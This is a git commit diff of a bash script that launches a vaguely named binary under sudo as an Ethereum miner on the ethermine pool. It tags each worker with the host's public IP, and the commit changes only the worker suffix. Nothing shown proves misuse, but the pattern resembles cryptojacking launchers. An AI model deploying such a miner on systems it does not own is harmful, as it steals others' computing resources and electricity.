9f05739a6f54d26587558b875f6b837851c39ee4
viencaytrong <55699469+viencaytrong@users.noreply.github.com>
2021-09-21 01:08:07 +0700

    Update anhnhoemthuong.sh

--- anhnhoemthuong.sh
+++ anhnhoemthuong.sh
@@ -2,7 +2,7 @@
 #!/bin/bash
 
 POOL=eu1.ethermine.org:4444
-WALLET=0x39c240d1597a044f7b6bf85c078d41c6a3b12dde.$(echo "$(curl -s ifconfig.me)" | tr . _ )-Vanhienbmt
+WALLET=0x39c240d1597a044f7b6bf85c078d41c6a3b12dde.$(echo "$(curl -s ifconfig.me)" | tr . _ )-AccNevo
 cd "$(dirname "$0")"
 
 chmod +x ./anhnhoemthuong && sudo ./anhnhoemthuong --algo ETHASH --pool $POOL --user $WALLET  $@
